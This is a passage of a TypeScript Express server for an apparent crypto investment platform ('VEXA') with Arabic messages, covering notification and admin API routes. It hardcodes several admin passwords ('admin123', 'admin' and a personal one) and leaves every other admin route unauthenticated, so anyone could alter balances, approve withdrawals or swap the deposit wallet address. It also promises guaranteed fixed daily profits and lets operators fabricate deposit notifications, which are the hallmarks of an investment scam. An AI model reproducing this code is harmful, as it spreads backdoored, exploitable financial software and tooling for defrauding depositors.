      newBalance: user.financials.availableBalance
    }
  });
});

// 23. Lucky Wheel: History
app.get('/api/lucky-wheel/history', (req: Request, res: Response) => {
  return res.json({
    success: true,
    data: [
      { id: "sp_1", prize: "$10.00", date: "أمس" },
      { id: "sp_2", prize: "$5.00", date: "منذ 3 أيام" }
    ]
  });
});

// 24. Notifications: List
app.get('/api/notifications', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  return res.json({
    success: true,
    data: user.notifications
  });
});

// 25. Notifications: Mark Read
app.post('/api/notifications/mark-read', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  const { notificationId } = req.body;
  if (notificationId) {
    const item = user.notifications.find(n => n.id === notificationId);
    if (item) item.isRead = true;
  } else {
    user.notifications.forEach(n => n.isRead = true);
  }
  return res.json({ success: true });
});

// 26. Notifications: Clear
app.post('/api/notifications/clear', (req: Request, res: Response) => {
  const user = getAuthUser(req) || demoUser;
  user.notifications = [];
  return res.json({ success: true });
});

// --- ADMIN API ENDPOINTS ---

// Admin: Auth check
app.post('/api/admin/auth', (req: Request, res: Response) => {
  const { password } = req.body;
  if (password === 'hemoome19952000' || password === platformSettings.adminPassword || password === 'admin123' || password === 'admin') {
    return res.json({ success: true, message: 'تم تسجيل الدخول كمسؤول' });
  }
  return res.status(401).json({ success: false, message: 'رمز الدخول غير صحيح' });
});

// Admin: Platform Overview & Data
app.get('/api/admin/overview', (_req: Request, res: Response) => {
  const uniqueUsers = Array.from(users.values())
    .filter((u, idx, arr) => arr.findIndex(x => x.id === u.id) === idx)
    .filter(u => u.id !== 'admin_master_07519952000');
  
  let totalDeposits = 0;
  let totalWithdrawals = 0;
  let totalBalances = 0;
  let totalContracts = 0;

  uniqueUsers.forEach(u => {
    totalDeposits += u.financials.totalDeposits || 0;
    totalWithdrawals += u.financials.totalWithdrawals || 0;
    totalBalances += u.financials.availableBalance || 0;
    if (u.activeContract) totalContracts++;
  });

  const allTransactions: any[] = [];
  uniqueUsers.forEach(u => {
    (u.transactions || []).forEach(tx => {
      allTransactions.push({
        ...tx,
        userName: u.fullName,
        userPhone: u.phoneNumber,
        userId: u.id
      });
    });
  });
  allTransactions.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

  return res.json({
    success: true,
    stats: {
      totalUsers: uniqueUsers.length,
      totalDeposits,
      totalWithdrawals,
      totalBalances,
      activeContractsCount: totalContracts
    },
    users: uniqueUsers.map(u => ({
      id: u.id,
      fullName: u.fullName,
      phoneNumber: u.phoneNumber,
      availableBalance: u.financials.availableBalance,
      totalDeposits: u.financials.totalDeposits,
      totalWithdrawals: u.financials.totalWithdrawals,
      honorScore: u.honorScore,
      membershipLevel: u.membershipLevel,
      activeContractName: u.activeContract?.contractName || 'لا يوجد',
      mysteryChances: u.mysteryBox.availableChances,
      luckySpins: u.luckyWheel.spinsRemaining,
      createdAt: u.createdAt
    })),
    contracts: CONTRACTS,
    transactions: allTransactions.slice(0, 50),
    settings: platformSettings
  });
});

// Admin: Modify User Balance
app.post('/api/admin/user/balance', (req: Request, res: Response) => {
  const { userId, amount, action, reason } = req.body;
  const numAmount = Number(amount);
  if (!userId || isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ success: false, message: 'بيانات غير صالحة' });
  }

  const user = users.get(userId);
  if (!user) {
    return res.status(404).json({ success: false, message: 'المستخدم غير موجود' });
  }

  if (action === 'add') {
    user.financials.availableBalance += numAmount;
    user.financials.totalDeposits += numAmount;
    user.notifications.unshift({
      id: `notif_${Date.now()}`,
      type: 'deposit',
      category: 'financial',
      title: 'إيداع إداري',
      message: reason || `تم إضافة رصيد بقيمة $${numAmount} إلى حسابك من قبل إدارة المنصة.`,
      time: 'الآن',
      isRead: false,
      amount: `+$${numAmount}`,
      createdAt: Date.now()
    });
  } else if (action === 'deduct') {
    user.financials.availableBalance = Math.max(0, user.financials.availableBalance - numAmount);
    user.notifications.unshift({
      id: `notif_${Date.now()}`,
      type: 'withdrawal',
      category: 'financial',
      title: 'خصم إداري',
      message: reason || `تم خصم مبلغ $${numAmount} من حسابك من قبل الإدارة.`,
      time: 'الآن',
      isRead: false,
      amount: `-$${numAmount}`,
      createdAt: Date.now()
    });
  } else if (action === 'set') {
    user.financials.availableBalance = numAmount;
  }

  user.transactions.unshift({
    id: `tx_${Date.now()}`,
    type: action === 'add' ? 'deposit' : 'withdrawal',
    amount: action === 'add' ? numAmount : -numAmount,
    status: 'completed',
    timestamp: Date.now(),
    description: reason || 'تعديل إداري للرصيد'
  });

  return res.json({
    success: true,
    message: 'تم تحديث رصيد المستخدم بنجاح',
    newBalance: user.financials.availableBalance
  });
});

// Admin: Update Honor Score
app.post('/api/admin/user/honor-score', (req: Request, res: Response) => {
  const { userId, honorScore } = req.body;
  const score = Math.max(0, Math.min(100, Number(honorScore) || 100));
  const user = users.get(userId);
  if (!user) return res.status(404).json({ success: false, message: 'المستخدم غير موجود' });

  user.honorScore = score;
  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'system',
    category: 'system',
    title: 'تحديث نقاط الشرف',
    message: `تم تحديث نقاط الشرف لحسابك لتصبح ${score}/100.`,
    time: 'الآن',
    isRead: false,
    createdAt: Date.now()
  });

  return res.json({ success: true, message: `تم تحديث نقاط الشرف إلى ${score}` });
});

// Admin: Grant Mystery Chances & Spins
app.post('/api/admin/user/chances', (req: Request, res: Response) => {
  const { userId, mysteryChances, luckySpins } = req.body;
  const user = users.get(userId);
  if (!user) return res.status(404).json({ success: false, message: 'المستخدم غير موجود' });

  if (mysteryChances !== undefined) {
    user.mysteryBox.availableChances += Number(mysteryChances);
  }
  if (luckySpins !== undefined) {
    user.luckyWheel.spinsRemaining += Number(luckySpins);
    user.luckyWheel.alreadySpunToday = false;
  }

  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: 'system',
    category: 'system',
    title: 'مكافآت وفرص حظ جديدة',
    message: 'تمت إضافة فرص جديدة لك لفتح الصناديق وعجلة الحظ من قبل إدارة المنصة!',
    time: 'الآن',
    isRead: false,
    createdAt: Date.now()
  });

  return res.json({
    success: true,
    message: 'تم منح الفرص والمكافآت للمستخدم بنجاح',
    data: {
      mysteryChances: user.mysteryBox.availableChances,
      luckySpins: user.luckyWheel.spinsRemaining
    }
  });
});

// Admin: Update Wallet Settings
app.post('/api/admin/wallet-config', (req: Request, res: Response) => {
  const { depositAddress, depositNetwork, minDeposit, minWithdrawal, adminPassword } = req.body;
  if (depositAddress) platformSettings.depositAddress = depositAddress.trim();
  if (depositNetwork) platformSettings.depositNetwork = depositNetwork.trim();
  if (minDeposit) platformSettings.minDeposit = Number(minDeposit);
  if (minWithdrawal) platformSettings.minWithdrawal = Number(minWithdrawal);
  if (adminPassword) platformSettings.adminPassword = adminPassword.trim();

  users.forEach(u => {
    u.stats.depositAddress = platformSettings.depositAddress;
    u.stats.depositNetwork = platformSettings.depositNetwork;
  });

  return res.json({
    success: true,
    message: 'تم تحديث إعدادات محفظة المنصة بنجاح',
    settings: platformSettings
  });
});

// Admin: Update or Add Contract (Price, Days, Profit, Title)
app.post('/api/admin/contract/update', (req: Request, res: Response) => {
  const { contractId, titleAr, titleEn, investmentAmount, dailyProfit, durationDays, description, badgeKeyAr } = req.body;
  
  const investAmt = investmentAmount !== undefined ? Number(investmentAmount) : undefined;
  const days = durationDays !== undefined ? Number(durationDays) : undefined;
  const profit = dailyProfit !== undefined ? Number(dailyProfit) : undefined;

  let contract = CONTRACTS.find(c => c.contractId === contractId);

  if (contract) {
    if (titleAr) { contract.titleAr = titleAr; contract.contractName = titleAr; }
    if (titleEn) contract.titleEn = titleEn;
    if (investAmt !== undefined && !isNaN(investAmt)) contract.investmentAmount = investAmt;
    if (days !== undefined && !isNaN(days)) contract.durationDays = days;
    if (profit !== undefined && !isNaN(profit)) {
      contract.dailyProfit = profit;
      contract.monthlyProfit = Number((profit * 30).toFixed(1));
      contract.annualProfit = Number((profit * 365).toFixed(1));
    }
    if (description) contract.description = description;
    if (badgeKeyAr) { contract.badgeKeyAr = badgeKeyAr; contract.badgeKey = badgeKeyAr; }
  } else {
    const defaultProfit = profit !== undefined && !isNaN(profit) ? profit : 5;
    CONTRACTS.push({
      contractId: contractId || `contract_${Date.now()}`,
      contractName: titleAr || 'عقد استثماري جديد',
      titleAr: titleAr || 'عقد استثماري جديد',
      titleEn: titleEn || 'Custom Contract',
      investmentAmount: investAmt !== undefined && !isNaN(investAmt) ? investAmt : 100,
      dailyProfit: defaultProfit,
      monthlyProfit: Number((defaultProfit * 30).toFixed(1)),
      annualProfit: Number((defaultProfit * 365).toFixed(1)),
      durationDays: days !== undefined && !isNaN(days) ? days : 30,
      badgeKey: badgeKeyAr || 'عقد استثماري معتمد',
      badgeKeyAr: badgeKeyAr || 'عقد استثماري معتمد',
      badgeKeyEn: 'Verified Contract',
      description: description || 'عقد استثماري بعوائد يومية ثابتة ومؤمنة.',
      color: 'from-amber-500 via-amber-600 to-amber-700',
      border: 'border-amber-500/30',
      glow: 'shadow-amber-500/10',
      badgeBg: 'bg-amber-500/10 text-amber-300 border-amber-500/20'
    });
  }

  saveContracts(CONTRACTS);

  return res.json({
    success: true,
    message: 'تم حفظ وتعديل بيانات العقد بنجاح',
    contracts: CONTRACTS
  });
});

// Admin: Delete Contract
app.post('/api/admin/contract/delete', (req: Request, res: Response) => {
  const { contractId } = req.body;
  if (!contractId) return res.status(400).json({ success: false, message: 'معرف العقد مطلوب' });

  CONTRACTS = CONTRACTS.filter(c => c.contractId !== contractId);
  saveContracts(CONTRACTS);

  return res.json({
    success: true,
    message: 'تم حذف باقة العقد بنجاح',
    contracts: CONTRACTS
  });
});

// Admin: Broadcast Notification to all users
app.post('/api/admin/broadcast-notification', (req: Request, res: Response) => {
  const { title, message, category } = req.body;
  if (!title || !message) {
    return res.status(400).json({ success: false, message: 'العنوان والرسالة مطلوبان' });
  }

  const notif = {
    id: `notif_${Date.now()}`,
    type: 'system' as const,
    category: (category || 'system') as any,
    title,
    message,
    time: 'الآن',
    isRead: false,
    createdAt: Date.now()
  };

  users.forEach(u => {
    u.notifications.unshift({ ...notif, id: `notif_${Date.now()}_${u.id}` });
  });

  return res.json({ success: true, message: 'تم إرسال الإشعار لجميع المستثمرين بنجاح' });
});

// Admin: Approve or Reject Transaction
app.post('/api/admin/transaction/status', (req: Request, res: Response) => {
  const { txId, userId, status } = req.body;
  const user = users.get(userId);
  if (!user) return res.status(404).json({ success: false, message: 'المستخدم غير موجود' });

  const tx = user.transactions.find(t => t.id === txId);
  if (!tx) return res.status(404).json({ success: false, message: 'العملية غير موجودة' });

  tx.status = status;
  user.notifications.unshift({
    id: `notif_${Date.now()}`,
    type: tx.type as any,
    category: 'financial',
    title: status === 'completed' ? 'تمت الموافقة على العملية' : 'تم رفض العملية',
    message: status === 'completed'
      ? `تمت معالجة وتأكيد عمليتك بقيمة $${Math.abs(tx.amount)} بنجاح.`
      : `تم رفض العملية بقيمة $${Math.abs(tx.amount)}. يرجى مراجعة الدعم الفني.`,
    time: 'الآن',
    isRead: false,
    amount: `$${Math.abs(tx.amount)}`,
    createdAt: Date.now()
  });

  return res.json({ success: true, message: 'تم تحديث حالة العملية بنجاح' });
});

// Serve Admin Dashboard page
app.get('/admin', (_req: Request, res: Response) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Fallback to SPA index.html
app.get('*', (req: Request, res: Response) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start Express Server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[VEXA Server] Running on http://0.0.0.0:${PORT}`);
});
